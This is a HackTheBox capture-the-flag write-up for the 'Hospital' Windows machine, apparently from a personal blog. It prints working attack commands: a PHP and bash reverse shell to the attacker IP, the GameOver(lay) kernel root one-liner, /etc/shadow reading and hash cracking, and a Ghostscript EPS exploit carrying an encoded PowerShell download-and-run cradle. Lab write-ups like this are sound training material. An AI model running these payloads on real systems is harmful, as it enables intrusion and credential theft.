+++
date = '2025-02-04T08:52:13-05:00'
draft = false
title = 'HtB Hospital'
tags = ['writeup','hackthebox','medium','windows']
hideToc = false
+++
![HtB Hospital](/images/Hospital.png)

Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a `RoundCube` instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via [CVE-2023-35001](https://nvd.nist.gov/vuln/detail/CVE-2023-35001). Privileged access allows `/etc/shadow` hashes to be read and subsequently cracked, yielding credentials for the `RoundCube` instance. Emails on the service hint towards the use of `GhostScript`, which opens up the target to exploitation via [CVE-2023-36664](https://nvd.nist.gov/vuln/detail/CVE-2023-36664), a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture `administrator` credentials, or by abusing misconfigured `XAMPP` permissions.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ nmap -T4 -p- -A 10.129.229.189      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 21:36 EST
Nmap scan report for hospital.htb (10.129.229.189)
Host is up (0.022s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-02-04 09:37:53Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-02-03T09:34:06
|_Not valid after:  2025-08-05T09:34:06
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-04T09:38:45+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6637/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
9389/tcp open  mc-nmf            .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 4.15 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-04T09:38:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
```
### https - 443/tcp
![Hospital1](/images/hosital1.png)
Looks to be RoundCube webmail running on the SSL web server.

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ gobuster dir -u https://hospital.htb/ -w /usr/share/wordlists/dirb/big.txt -k --exclude-length 303
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://hospital.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          303
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico      (Status: 200) [Size: 16958]
/examples         (Status: 503) [Size: 403]
/installer        (Status: 301) [Size: 343] [--> https://hospital.htb/installer/]
/licenses         (Status: 403) [Size: 422]
/phpmyadmin       (Status: 403) [Size: 422]
/server-info      (Status: 403) [Size: 422]
/server-status    (Status: 403) [Size: 422]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

### http - 8080/tcp

![Hospital 2](/images/hospital2.png)
Some sort of unknown login page... let's make an account.

![Hospital 3](/images/hospital3.png)
File upload opportunity once logged in. Let's upload a cat picture `cat2.png` and see if we can find it.

![Hospital 4](/images/hospital4.png)
Found it! Maybe a reverse shell later?

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ gobuster dir -u http://hospital.htb:8080/ -w /usr/share/wordlists/dirb/big.txt    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hospital.htb:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess      (Status: 403) [Size: 279]
/.htpasswd      (Status: 403) [Size: 279]
/css            (Status: 301) [Size: 317] [--> http://hospital.htb:8080/css/]
/fonts          (Status: 301) [Size: 319] [--> http://hospital.htb:8080/fonts/]
/images         (Status: 301) [Size: 320] [--> http://hospital.htb:8080/images/]
/js             (Status: 301) [Size: 316] [--> http://hospital.htb:8080/js/]
/server-status  (Status: 403) [Size: 279]
/uploads        (Status: 301) [Size: 321] [--> http://hospital.htb:8080/uploads/]
/vendor         (Status: 301) [Size: 320] [--> http://hospital.htb:8080/vendor/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

## Initial Access

### Unrestricted File Upload - Reverse Shell
We can tell by looking at the website, php is utilized.  Let's check and see if we can bypass the filetype restriction using Burpsuite.  We intercept the request and modify some of the values to see how the server reacts.  In this case, we can simply use the extension `.phar` to get a successful upload. No magic bytes, no MIME restrictions, etc.

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f raw -o shell.phar   
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1112 bytes
Saved as: shell.phar
```

Now upload `shell.phar` and navigate to `http://hospital.htb:8080/uploads/shell.phar` and be sure to have a Metasploit `multi/handler` running and awaiting the connection.

![Hospital 5](/images/hospital5.png)

### Enumeration
With our shell as `www-data`, we take a look around and find some interesting things. It's also important to mention that we seem to be inside a container, as we have a Linux-based file structure and the machine is running Windows.

```sh
meterpreter > sysinfo
Computer    : webserver
OS          : Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64
Meterpreter : php/linux
```

`/var/www/html/config.php`:
```sh
meterpreter > cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

### Reverse Shell #2
At this point, I can't execute simple bash commands or get out of the limited meterpreter shell. Lets try another method to get a shell.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ weevely generate shell shell.phar           
Generated 'shell.phar' with password 'shell' of 692 byte size.
```

Now upload the `shell.phar` as we did before.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ weevely http://hospital.htb:8080/uploads/shell.phar shell
[+] weevely 4.0.1

[+] Target:     hospital.htb:8080
[+] Session:    /home/pl4stic/.weevely/sessions/hospital.htb/shell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
www-data@webserver:/var/www/html/uploads $
```

And now let's get a more stable shell:
```sh
bash -c 'bash -i >& /dev/tcp/10.10.14.84/4444 0>&1'
```

### mySQL

Remember that we have login credentials for the SQL server that we found in `config.php` earlier. Let's try and use them.

```sh
www-data@webserver:/$ mysql -u root -p
mysql -u root -p
Enter password: my$qls3rv1c3!

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```sql
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.009 sec)

MariaDB [(none)]> use hospital;
use hospital;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hospital]> show tables;
show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> SELECT * FROM users;
SELECT * FROM users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | test     | $2y$10$I5boHeTsD5s1PHjgY65qoOoq3RUz.q6dHQiboEgMcxh.V841NMcMq | 2025-02-04 09:50:49 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.000 sec)
```

Now lets crack the `admin` hash.

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ hashcat -m 3200 '$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2' /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.2.6) starting
<--snip-->
$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
<--snip-->
```

We have a new set of credentials... `admin:123456`
Unfortunately, they do not work for either of the two users on this container (`root` or `drwilliams`)

### Kernel Exploits

Realize I've gone too far down the rabbit hole without checking some pretty basic things first. Let's see if this linux kernel is vulnerable to any known exploits.

```sh
www-data@webserver:/$ uname -a
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Some simple Google searches and I come across an possible exploit: [GameOver(lay)](https://www.crowdstrike.com/en-us/blog/crowdstrike-discovers-new-container-exploit/)

```sh
www-data@webserver:/var/www/html$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
< os;os.setuid(0);os.system("rm -rf l m u w; bash")'
root@webserver:/var/www/html# whoami
whoami
root
root@webserver:/var/www/html#
```

Now that we're root, we can grab `drwilliams`' hash and try to crack it.

```sh
root@webserver:/var/www/html# cat /etc/shadow
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19<--snip-->
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital]
└─$ hashcat '$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/' /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting in autodetect mode
<--snip-->
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

`drwilliams:qwe123!@#`

We fire up `netexec` to check those credentials on the computer, and they're good. No writeable SMB shares, RDP, or WinRM options though.

### RoundCube Webmail

The credentials do work on the RoundCube webmail (`https://hospital.htb/`), however.
![Hospital 6](/images/hospital6.png)

We're able to glean another username, `drbrown`, and a possible method of having him execute a payload that we can email his way. A little Google research shows [CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) allows for command injection via `.eps` files... exactly what we need.

Let's grab the POC and fire up metasploit.

```sh
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST tun0
msf6 exploit(multi/script/web_delivery) > set LPORT 4545
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.84:4445 
[*] Using URL: http://10.10.14.84:8081/6bmJn8b
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmAEMAUgBDAGYAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZgBDAFIAQwBmAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZgBDAFIAQwBmAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAA0ADoAOAAwADgAMQAvADYAYgBtAEoAbgA4AGIALwBXADQATABFADQAWAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAA0ADoAOAAwADgAMQAvADYAYgBtAEoAbgA4AGIAJwApACkAOwA=
```

POC usage:
```sh
┌──(venv)─(pl4stic㉿shattersec)-[~/htb/hospital/CVE-2023-36664-Ghostscript-command-injection]
└─$ python CVE_2023_36664_exploit.py -g --filename needle --extension eps --payload 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmAEMAUgBDAGYAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZgBDAFIAQwBmAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZgBDAFIAQwBmAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAA0ADoAOAAwADgAMQAvADYAYgBtAEoAbgA4AGIALwBXADQATABFADQAWAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAA0ADoAOAAwADgAMQAvADYAYgBtAEoAbgA4AGIAJwApACkAOwA='
[+] Generated EPS payload file: needle.eps
```

Now email the `needle.eps` file back to `drbrown` and wait for your `meterpreter` shell.

We immediately find a `.bat` script that executes the `.eps` files, and it has `drbrown`'s password in cleartext.

```bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

`drbrown:chr!$br0wn`
## Privilege Escalation

### Remote Desktop

We find out `drbrown` can connect via RDP:
![Hopsital7](/images/hospital7.png)

Upon loading in, Internet Explorer was already on the screen with a saved password prefilled on the RoundCube webmail. I clicked eye icon to unmask it, and voila, a password:

`Administrator:Th3B3stH0sp1t4l9786!`